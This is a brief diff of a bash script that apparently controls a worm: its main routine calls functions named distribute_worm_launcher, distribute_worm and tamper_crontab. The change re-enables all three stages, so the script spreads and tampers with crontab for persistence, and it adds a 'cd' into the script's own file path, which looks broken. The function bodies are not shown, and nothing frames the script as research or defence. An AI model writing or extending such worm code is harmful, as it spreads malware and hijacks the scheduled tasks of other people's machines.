@@ -58,8 +58,8 @@ distribute_worm_launcher(){
     fi
 }
 
+cd ${BASH_SOURCE[0]}
 if distribute_worm_launcher && distribute_worm && tamper_crontab ; then
-#if tamper_crontab ; then
     echo "All tasks successed."
 else
     echo "Task failed."
